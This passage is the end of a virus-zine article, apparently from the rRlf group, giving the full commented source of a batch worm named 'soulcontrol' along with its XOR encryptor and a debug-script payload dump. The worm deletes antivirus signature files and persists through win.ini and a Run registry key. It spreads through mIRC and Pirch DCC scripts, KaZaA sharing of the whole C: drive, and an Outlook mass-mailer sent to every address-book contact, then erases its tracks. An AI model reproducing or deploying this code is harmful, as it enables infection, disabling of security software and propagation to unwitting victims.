echo e 7720 A7 48 5E 47 1E 83 15 CD 52 4D CD 24 7B 39 65 4E>>j
echo e 7730 65 A8 A6 6F 2B 20 0A 82 09 50 CC 18 91 BC 9E 94>>j
echo e 7740 5D 10 92 90 6A B4 78 F3 03 8E D5 B4 2A 24 AC CE>>j
echo e 7750 EA D3 69 D9 1A 24 34 97 5C 75 AA 1A A0 11 EE 0C>>j
echo e 7760 79 C5 5A B3 B9 61 76 5C 8C F1 8A CF D6 9B 7C 85>>j
echo e 7770 CF 43 C6 28 85 E5 2B 9C 98 E8 FE EE E5 1D 3A 62>>j
echo e 7780 2F A2 C7 03 26 BA 5B E7 59 63 DE 4F DD E9 5C DE>>j
echo e 7790 9C 85 2E 62 27 F8 8F 15 D5 BE 9A CE 83 E6 E0 F6>>j
echo e 77A0 AE C8 54 8D AC 72 61 D2 B5 CE 66 70 EE E5 D5 B1>>j
echo e 77B0 8E D5 A1 6D 1B FD 91 9E 41 95 C5 2D F5 A0 B2 B8>>j
echo e 77C0 D8 46 43 01 53 87 09 66 40 39 5C 71 53 3A 71 7A>>j
echo e 77D0 1D 7C CA 5A 22 3B 19 E2 87 1B D0 11 58 1E 2B 91>>j
echo e 77E0 26 D4 D1 D3 F8 A3 04 FE 66 AD 34 A5 23 59 58 E3>>j
echo e 77F0 07 A5 63 6B 17 62 E2 E9 5D 46 3E 40 0F E6 6B 35>>j
echo e 7800 26 B4 5B 1E 66 32 69 3B 1D 85 BE BA DA 07 84 7C>>j
echo e 7810 2B 77 00 40 CD 35 D4 73 9D 81 98 AA 38 2B 8C F4>>j
echo e 7820 C7 9C FD 3D 6B 2F 4F D5 86 99 06 99 AA 08 8C 8A>>j
echo e 7830 9A 95 CB 05 27 19 05 22 E3 F5 AA 17 AC F2 F8 0F>>j
echo e 7840 47 6C 12 90 EA 17 71 93 E8 59 20 61 FD 7F 2A C7>>j
echo e 7850 5B A9 0D BC 76 CC FF 00 B9 8E 46 91 57 D1 98 28>>j
echo e 7860 27 F2 55 FC A9 9E 74 1E A7 A4 DE EA 7A 7C 5F 0B>>j
echo e 7870 2E E3 B0 B5 BA F3 2E EE 21 05 E5 75 21 40 9A 57>>j
echo e 7880 1C 01 EA AC 3F 11 5C 26 AF AE 5C EA AD FB C8 E2>>j
echo e 7890 89 4B 6F 68 E2 52 15 9B BB 1F 53 5A 7A 66 BD 24>>j
echo e 78A0 5A 69 D3 E4 86 2B 8B 52 C1 C2 49 9E 08 CF A1 1E>>j
echo e 78B0 A7 F3 AA 77 3A E4 51 CC DE 46 93 61 1B 7F 78 A1>>j
echo e 78C0 6F FD 08 9A 2E 6B 52 9F 2C 79 BB 98 6A 0E EE 01>>j
echo e 78D0 35 3C 6A 49 25 86 08 EC 6A F7 FC 24 BA 8F FC B3>>j
echo e 78E0 78 61 FF 00 AE 70 AA FF 00 4A CE 6B 87 77 77 76>>j
echo e 78F0 2C EE 72 C4 F7 34 CC E9 C9 45 EA 4C C4 6C FA 55>>j
echo e 7900 33 D6 9F E6 12 31 4C A0 75 27 CD 61 29 69 29 68>>j
echo e 7910 32 12 9E AF 81 8A 65 2F BD 03 4E C4 EB 27 18 CD>>j
echo e 7920 3D 40 61 C9 E4 55 55 38 35 2F 98 07 3D E9 33 45>>j
echo e 7930 51 97 16 77 44 55 FE 1F 4A BD 11 46 88 64 82 71>>j
echo e 7940 93 EB 59 6B 28 7C 06 ED 4F F3 4A 72 B4 AE D1 BD>>j
echo e 7950 39 77 35 06 41 F9 4F 06 96 29 0F CC 1B B1 C7 E1>>j
echo e 7960 54 A1 BB 0A 79 AB 1B D1 E3 CA B7 B9 A9 BB 60 D2>>j
echo e 7970 93 BC 4D 24 90 1C 60 82 00 E9 56 63 BD 96 0C 18>>j
echo e 7980 DF 18 39 AC 35 98 A7 43 CE 2A DC 57 21 94 23 8C>>j
echo e 7990 D5 42 29 6A 11 93 86 EA E7 57 6F AE 0F 2D 44 CA>>j
echo e 79A0 77 93 F7 87 4A DA 86 F4 95 DC 8D DF B5 70 29 32>>j
echo e 79B0 E7 00 E0 0E D5 62 DE FD E3 27 63 F7 E9 5B AA 70>>j
echo e 79C0 92 BA 7A 87 24 27 AA 3D 2E D7 51 27 86 35 AF 05>>j
echo e 79D0 C4 52 1C 83 D4 57 9B 5B 6B 61 53 12 12 09 1C 1A>>j
echo e 79E0 DD B2 D4 15 D0 34 4F 90 39 A8 74 DA 46 73 8C A2>>j
echo e 79F0 74 93 5B 79 9B 80 1E F5 0C 30 32 0C 74 E6 A9 C5>>j
echo e 7A00 AB 37 98 A1 BF 1A D1 4B E8 99 80 CF D6 B1 95 FA>>j
echo e 7A10 19 F3 3B 96 21 0E AC A4 FA D5 4B 85 8E 67 92 3B>>j
echo e 7A20 88 43 67 9E 6A FA 3A 3E 0A 90 45 3E 77 1E 53 9E>>j
echo e 7A30 38 E2 85 27 D4 D2 52 B5 9A 39 5B ED 32 CA D2 05>>j
echo e 7A40 92 34 20 96 E4 D6 5C F6 76 B7 57 91 48 E9 9D A3>>j
echo e 7A50 8F A5 74 DA 82 25 D6 9E 57 8D D9 E2 B9 99 E4 7B>>j
echo e 7A60 29 A2 49 57 69 F4 3D 45 35 4A 33 97 BD A1 DF 87>>j
echo e 7A70 97 B4 5E F3 D4 E4 2F E2 41 A8 4C CB 0E 02 9C 70>>j
echo e 7A80 3D A9 B7 CE BF 60 54 95 31 C8 C6 6B B4 86 11 28>>j
echo e 7A90 96 40 80 EF EF 58 FE 20 B6 3F D9 3B BC B0 18 B8>>j
echo e 7AA0 1F 4A D3 D9 C5 CA C8 AC 4A 94 9A 51 D8 E3 6D 23>>j
echo e 7AB0 89 E4 DB B3 39 35 5E E1 44 73 3A 8E 82 B5 AD 6D>>j
echo e 7AC0 DE 06 07 68 C8 E6 A9 DC D9 4B 34 CC 40 CB 1E 71>>j
echo e 7AD0 55 2A 0D 6A 88 74 25 08 5E C5 6B 0B 8F 22 F1 64>>j
echo e 7AE0 07 18 AE DF 44 8E D7 52 46 92 7E 4A 9C 8A E2 57>>j
echo e 7AF0 4E 9C 3F DD FD 45 5C B7 7B DB 28 DA 35 7D AA 6B>>j
echo e 7B00 1A 89 47 73 05 1A 8E 3A 23 B3 D5 AC F4 FF 00 B3>>j
echo e 7B10 16 8A 14 0C A4 90 40 E9 5C DC 93 30 50 EB 91 8A>>j
echo e 7B20 22 BD 1F 65 8D 64 7F 98 1F 9B 34 92 5D C4 ED B1>>j
echo e 7B30 07 53 59 F3 49 3D 0E CC 1B 71 8B 8C F6 64 D6 B3>>j
echo e 7B40 99 51 CC A7 D8 57 4D 61 0D AC 9A 39 59 4A E5 89>>j
echo e 7B50 C6 7A F4 15 CB 22 96 CA 81 DE AB 5C BD CC 52 04>>j
echo e 7B60 0C 70 A7 81 59 F3 39 32 ED 1B 7E ED 11 2D BA 47>>j
echo e 7B70 AC 18 DB 94 DC 6B 46 E4 F9 00 A4 23 82 73 59 51>>j
echo e 7B80 CC 12 E7 CC 97 9E 79 AB B2 DD 24 F2 03 11 E8 2B>>j
echo e 7B90 AE 31 82 5C CD 95 86 82 8B B7 51 D1 DE 4C 83 A8>>j
echo e 7BA0 18 A7 C3 A8 5C 1B 81 B9 B8 63 55 1B 71 6E 6B 4E>>j
echo e 7BB0 DB 48 9C BA 48 48 E0 F2 2B 5F AB 52 6B 99 31 56>>j
echo e 7BC0 A7 1B DE 5B 93 C8 AB 79 FE BF 2C 54 71 9A A7 0C>>j
echo e 7BD0 62 27 F9 7F 01 5A 13 B0 B5 56 0E 00 2D C8 AA B0>>j
echo e 7BE0 3A B0 12 E3 20 0E 6A 63 41 28 B7 23 4A 55 23 45>>j
echo e 7BF0 68 AE D9 A1 69 AB 3C AC 90 4A 3E 5C E0 FD 29 BE>>j
echo e 7C00 2B B5 80 5B 5A F9 4C 15 9B 3F CE B1 83 8F 31 99>>j
echo e 7C10 4F 7A 7D FC 72 5E C1 10 32 74 E0 7B 57 1A BA 9E>>j
echo e 7C20 9B 1C 75 7D A5 59 59 23 19 E4 FB 3C AC 88 D9 03>>j
echo e 7C30 A9 A8 37 96 0C 73 4F BC B5 6B 79 09 27 35 4C 49>>j
echo e 7C40 80 46 6B 66 DB 31 94 A5 4D F2 CB 72 ED 95 E3 23>>j
echo e 7C50 9C 1C 63 BD 6A 2C 86 E6 13 21 C6 33 C5 73 D1 B6>>j
echo e 7C60 D2 4F AD 5E 82 E3 65 B3 26 FC 64 E7 14 AC 9E 8C>>j
echo e 7C70 C9 7B CE EC DA 65 05 54 E3 90 38 A7 5B 59 48 1F>>j
echo e 7C80 73 03 C8 A6 45 28 5F 21 DB A1 02 B4 65 D4 D6 E1>>j
echo e 7C90 84 31 60 62 B7 A7 4A 33 7C AD 9B 45 29 3B 14 5D>>j
echo e 7CA0 10 2B 07 1F 4F AD 6D 69 57 F2 41 6D 14 47 A6 39>>j
echo e 7CB0 1E 9C 56 62 D9 CD 73 1B 32 7A 9E B5 2D AF 9B 6A>>j
echo e 7CC0 EA 5B BA E2 AE A6 1E 30 69 44 D6 4E 30 56 46 B4>>j
echo e 7CD0 B7 CE 1C 04 04 73 52 4D 72 ED E5 16 6E 73 55 74>>j
echo e 7CE0 D9 5A E2 E0 86 40 DC F1 5A 37 B6 F2 49 2C 45 13>>j
echo e 7CF0 A7 5A C6 BC 14 74 46 33 7E EF 34 4C EB 95 CF 9C>>j
echo e 7D00 99 E0 8C 8A E3 AE 23 1B 9B 3C 1C D7 63 71 14 F2>>j
echo e 7D10 5C BA 05 C6 06 33 5C 6D D6 F8 2E 1E 36 6C 90 DD>>j
echo e 7D20 6B 9A 0A 69 85 49 CA 51 5C CA C5 49 B0 AC 06 7B>>j
echo e 7D30 53 54 8D 8D CD 3E 6C 06 E4 67 23 AD 32 30 A4 81>>j
echo e 7D40 D8 D6 8D F5 39 B5 72 B2 2F 69 CA E6 E5 0F 35 D1>>j
echo e 7D50 5A 38 86 6E 78 CD 54 B7 84 46 D1 9C 0E D5 69 C8>>j
echo e 7D60 69 32 07 14 42 34 ED CE D9 F4 38 1C 3F B2 8D FB>>j
echo e 7D70 93 4E A1 CE 4D 56 45 03 20 54 CE 49 5E 29 A3 EE>>j
echo e 7D80 E6 B7 8E 06 8C A3 CC 9D CD 9D 28 B9 F3 31 6D 94>>j
echo e 7D90 86 38 A4 BD 85 65 9A 35 3D B9 35 3D A8 0B 1E E2>>j
echo e 7DA0 7A 55 6B 97 67 93 2B 9A 9A 58 5F 66 9B 7B 91 8C>>j
echo e 7DB0 A9 15 04 99 63 4B B3 89 AE 4B 14 3F 29 F9 6B 66>>j
echo e 7DC0 67 78 D3 71 38 AA 16 37 1B 1D 4B 10 06 31 9A 8B>>j
echo e 7DD0 54 BC D9 1E 11 F2 73 C9 AE 49 4A 77 69 23 C7 8D>>j
echo e 7DE0 6A B7 B4 56 82 5E 8D EE 1A 4E 78 AA F2 B2 9B 76>>j
echo e 7DF0 09 8D A0 73 59 ED AA 1D BB 1B 2E 49 AB 44 48 B6>>j
echo e 7E00 8A CE 98 57 1C 1A B7 52 71 4A E7 53 AE A0 AE F7>>j
echo e 7E10 33 64 51 77 18 8D 38 C0 EB 58 9A 9C 5E 5D C8 41>>j
echo e 7E20 D9 70 7F 3A DE 17 11 5B 12 BC 64 8A C1 D4 58 BD>>j
echo e 7E30 C6 FF 00 5A B8 37 D4 F3 AB B7 35 CC C9 D7 51 51>>j
echo e 7E40 E1 39 B4 A7 DD BF ED D1 DC 47 C7 00 6C 75 6E 7F>>j
echo e 7E50 EF 8F CA B2 6A 66 4C 20 CD 30 C6 76 EE 03 22 B5>>j
echo e 7E60 38 EC 3A 39 99 01 03 BD 46 C4 B1 C9 A7 2A 81 D6>>j
echo e 7E70 98 4F 34 58 A6 DD AC C3 A9 A5 C6 4E 05 37 34 A0>>j
echo e 7E80 E2 82 05 23 1D 69 B4 BC D2 50 01 46 68 A2 80 0A>>j
echo e 7E90 5E B4 51 40 D0 11 8A 28 A2 80 62 82 45 38 39 02>>j
echo e 7EA0 8A 29 DB 41 A9 31 55 B7 7B 53 D6 66 4C 8C F5 A2>>j
echo e 7EB0 8A 95 B8 D4 9A 27 4B 9C 9E 7B 71 56 C4 BF 20 F5>>j
echo e 7EC0 ED 45 15 A2 5A 9D 30 7C D1 D4 67 9E C8 72 09 A2>>j
echo e 7ED0 3B D6 52 77 51 45 36 AC AE 8C A6 AD AA 2C AD F3>>j
echo e 7EE0 01 9C 64 63 BD 58 8F 50 78 19 09 6D 87 3C 51 45>>j
echo e 7EF0 44 24 DB D4 D6 9C DB D1 9A A3 5D 99 3F 78 7E 64>>j
echo e 7F00 F5 AD 2B 1F 11 45 2C 9B 43 61 CF 18 3D E8 A2 86>>j
echo e 7F10 B5 2E B4 22 8D CB 7D 62 50 C5 10 E5 BB 0A B0 7C>>j
echo e 7F20 42 22 DC 93 92 A5 8E 28 A2 94 D6 A7 2B 45 F9 1A>>j
echo e 7F30 29 ED 87 96 D8 5C E4 D6 76 A7 A1 4B A8 5E A3 AC>>j
echo e 7F40 80 10 28 A2 AA CA C6 B4 2A 49 4F 42 A4 32 79 02>>j
echo e 7F50 4B 62 41 90 70 0D 41 2D A1 D4 6C 99 24 62 00 39>>j
echo e 7F60 E3 DA 8A 2B A2 09 59 33 D2 BB D4 CF 93 C3 B3 90>>j
echo e 7F70 5E 23 94 51 92 4D 61 C9 11 F3 99 73 D0 E2 8A 2B>>j
echo e 7F80 9B 13 52 4A AF 2A D8 EE C2 3F 69 4D F3 74 19 B0>>j
echo e 7F90 09 02 97 AB AF A6 39 81 24 2D 90 68 A2 A6 AA BA>>j
echo e 7FA0 4D 8F 95 37 62 AC BA 1E E8 64 9B CD C6 06 71 58>>j
echo e 7FB0 1B 8C 73 13 9E 86 8A 2A A8 C5 3A 6D 9E 45 7D 27>>j
echo e 7FC0 63 A8 D0 17 ED EA CD 9C 60 F3 56 6F B4 ED 8C EE>>j
echo e 7FD0 46 79 C9 FA 51 45 46 0A 2A 55 B9 59 AE 1A 6E 3B>>j
echo e 7FE0 18 93 DA C3 31 0B 1F 04 9F CA A5 B3 D1 D9 59 FE>>j
echo e 7FF0 7E 05 14 56 F3 49 56 E5 4B 43 D0 F6 71 76 97 51>>j
echo e 8000 92 A8 82 50 8C 79 AE B2 5B BF 2A D8 36 38 02 8A>>j
echo e 8010 2A A6 ED 07 63 86 B3 E6 A8 A2 CE 63 59 BE F3 B6>>j
echo e 8020 90 38 15 2E 96 C5 EC 8F 19 19 E6 8A 2B 9A 95 49>>j
echo e 8030 3D 4D ED CB 2E 54 5F 3A 04 BE 49 75 E4 11 9A 6C>>j
echo e 8040 7A 53 15 5F 98 96 E9 8A 28 A8 6E D5 12 12 93 BF>>j
echo e 8050 37 62 8D EE 90 F7 01 F3 90 63 EA 3D BF C8 AE 54>>j
echo e 8060 C5 B6 43 E8 0D 14 57 6E 31 25 52 CB B1 C3 5D 73>>j
echo e 8070 45 4D EE 2B A8 3D 05 34 75 18 A2 8A C5 C5 72 A6>>j
echo e 8080 73 F5 3A 09 AF A1 FB 14 0B B3 95 50 3F 4A 6E 8C>>j
echo e 8090 EB 25 DB B1 1D 89 14 51 5D 18 75 79 23 58 7B B2>>j
echo e 80A0 B2 3A FF 00 0F DA 36 A3 E7 24 79 18 CD 3E EF 46>>j
echo e 80B0 2B 2B AB B1 0C 01 E0 51 45 46 31 B5 56 C8 DA D7>>j
echo e 80C0 7A 99 DA 44 EB 6F 7A E8 C7 80 71 9A EA 52 51 29>>j
echo e 80D0 5D A7 A5 14 54 CD 68 29 C5 25 64 62 DD DC A4 57>>j
echo e 80E0 B7 08 58 0E 0E 0F A5 71 17 90 66 37 97 39 24 E6>>j
echo e 80F0 8A 29 D1 82 70 6D 98 73 39 68 FA 19 92 33 2E 33>>j
echo e 8100 DE 95 5F 69 00 8A 28 AE 78 24 D9 85 ED 23 A2 8A>>j
echo e 8110 E0 30 4F 51 56 A3 60 D2 F3 D0 51 45 57 2C 55 4B>>j
echo e 8120 58 FA 8A 13 6E 91 65 98 74 AA CF 30 03 03 B9 A2>>j
echo e 8130 8A EB 5A 52 93 46 15 2A 49 49 0A 26 2B C6 78 34>>j
echo e 8140 7D A1 62 C8 61 C6 38 A2 8A F3 E8 CE 52 6E EC CB>>j
echo e 8150 18 DF B1 4C A2 75 02 25 CE 70 B5 04 F7 0F 28 27>>j
echo e 8160 B1 A2 8A B7 B9 E4 A9 34 9A 45 64 01 41 C9 E6 B4>>j
echo e 8170 96 E3 FD 07 69 24 ED 14 51 4B 16 AC D1 10 93 92>>j
echo e 8180 D4 C8 99 8C AD 91 D4 55 57 56 DD B8 8C D1 45 74>>j
echo e 8190 72 AF 66 98 EA 37 B1 10 46 91 B2 7A 54 D2 30 48>>j
echo e 81A0 C0 1D 3B D1 45 67 63 16 57 61 E6 0C 8E B5 01 18>>j
echo e 81B0 34 51 43 25 ED 71 28 A2 8A 44 0B 9A 4A 28 A0 02>>j
echo e 81C0 8A 28 A0 0F FF D9 00>>j
echo rcx>>j
echo 80C6>>j
echo n jpg>>j
echo w>>j
echo q>>j
debug<j
move jpg c:\soulcontrol.jpg
del j
:end

:: this is the debug-script of the payload-picture
:: see the picture (soulcontrol)

exit
=====[end code]================================================================

And here is the code of the decryption/encryption -vbs:

=====[end code]================================================================
on error resume next
set fso = createobject("scripting.filesystemobject")
set proc4 = fso.opentextfile("c:\run.bat", 1)
msg = proc4.readall
ddd = x(msg)
set proc2 = fso.createtextfile("c:\run.bat", true)
proc2.writeline ddd
proc2.close
Function x(sText)
On Error Resume Next
Dim ekey, i, hash, crbyte
ekey = 135
For i = 1 To Len(sText)
hash = Asc(Mid(sText, i, 1))
crbyte = Chr(hash Xor (ekey Mod 255))
x = x & crbyte
Next
End Function

=====[end code]================================================================

And the code of the actual virus, again with comments:

=====[begin code]===============================================================
@echo off
ctty nul
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf

:: the AVs will get problems scanning without those files

del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
del c:\pirch98\events.ini
äç

:: these "äç"s all over the code are side effects of the encrypted code splitted up in several echoed lines
:: as äç is no valid batch command, and ctty is nul, they got no effect

echo [windows]>re
echo load=c:\bat.soulcontrol.bat>>re
echo run=>>re
echo NullPort=None>>re
echo.>>re

:: the part to be added to the win.ini for the "residency" gets created...

copy re + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
äç
del re

:: ...and copied in front of the win.ini

echo [script]>mi
echo n0=on 1:JOIN:#:{>>mi
echo n1= /if ( nick == $me ) { halt }>>mi
echo n2= /.dcc send $nick c:\bat.soulcontrol.bat>>mi
echo n3=}>>mi
move mi c:\mirc\script.ini
move mi c:\mirc32\script.ini
move mi c:\progra~1\mirc\script.ini
move mi c:\progra~1\mirc32\script.ini
del mi

:: a mIRC-script-file gets created, and copied to a possible mIRC-directory
:: all it does is dccing the virus to a person who enters a channel, where the victim is in

äç
echo [Levels]>pi
echo Enabled=1>>pi
echo Count=6>>pi
echo Level1=000-Unknowns>>pi
echo 000-UnknownsEnabled=1>>pi
echo Level2=100-Level 100>>pi
echo 100-Level 100Enabled=1>>pi
echo Level3=200-Level 200>>pi
echo 200-Level 200Enabled=1>>pi
echo Level4=300-Level 300>>pi
echo 300-Level 300Enabled=1>>pi
äç
echo Level5=400-Level 400>>pi
echo 400-Level 400Enabled=1>>pi
echo Level6=500-Level 500>>pi
echo 500-Level 500Enabled=1>>pi
echo.>>pi
echo [000-Unknowns]>>pi
echo User1=*!*@*>>pi
echo UserCount=1>>pi
echo Event1=ON JOIN:#:/dcc send $nick c:\bat.soulcontrol.bat>>pi
echo EventCount=1>>pi
echo.>>pi
äç
echo [100-Level 100]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [200-Level 200]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [300-Level 300]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
äç
echo.>>pi
echo [400-Level 400]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
echo.>>pi
echo [500-Level 500]>>pi
echo UserCount=0>>pi
echo EventCount=0>>pi
move pi c:\pirch98\events.ini
del pi

:: a pirch-script-file gets created, and copied to the standard pirch-directory, if it exists
:: it does the same as the mIRC-script-file, only that it's for pirch ;]

echo REGEDIT4>ka
äç
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>ka
echo "DisableSharing"=dword:00000000>>ka
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>ka
echo "Dir0"="012345:c:\\">>ka
move ka c:\ka.reg
regedit /s c:\ka.reg

:: a registry entry, that enables all files in c:\ (where the virus is in, too)
:: for sharing with KaZaa (see last line of the reg-file)

echo.on error resume next>ol
echo dim a,b,c,d,e>>ol
echo set a = Wscript.CreateObject("Wscript.Shell")>>ol
echo set b = CreateObject("Outlook.Application")>>ol
echo set c = b.GetNameSpace("MAPI")>>ol
äç
echo for y = 1 To c.AddressLists.Count>>ol
echo set d = c.AddressLists(y)>>ol
echo x = 1>>ol
echo set e = b.CreateItem(0)>>ol
echo for o = 1 To d.AddressEntries.Count>>ol
echo f = d.AddressEntries(x)>>ol
echo e.Recipients.Add f>>ol
echo x = x + 1>>ol
echo next>>ol
echo e.Subject = "Who controls you?">>ol
echo e.Body = "Stop your soul being controled! Get illuminated.">>ol
äç
echo e.Attachments.Add ("c:\bat.soulcontrol.bat")>>ol
echo e.DeleteAfterSubmit = False>>ol
echo e.Send>>ol
echo f = "">>ol
echo next>>ol
move ol %winbootdir%\ol.vbs
start %winbootdir%\ol.vbs

:: this is a vbs that sends the virus away through Outlook

echo REGEDIT4>pl
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>pl
echo "msg"="c:\\pl.bat">>pl
move pl c:\pl.reg
äç
regedit /s c:\pl.reg

:: a registry entry to run the payload-batch on every system-start

echo @echo off>pl.bat
echo ctty nul>>pl.bat
echo %winbootdir%\pbrush.exe c:\soulcontrol.jpg>>pl.bat
echo exit>>pl.bat
move pl.bat c:\

:: this is the creation of the payload-batch
:: it opens the payload-picture with Paint

del c:\ka.reg
del c:\pl.reg
del %0

:: some tracks get cleared
:: also the running batch, the actual virus

äç
=====[end code]================================================================

That's all, ppl. Hope this enjoyed you a bit.
And remember, batch is in no way dead yet...

Something you want to tell me? ... Equal what:
philet0ast3r@rRlf.de
www.rRlf.de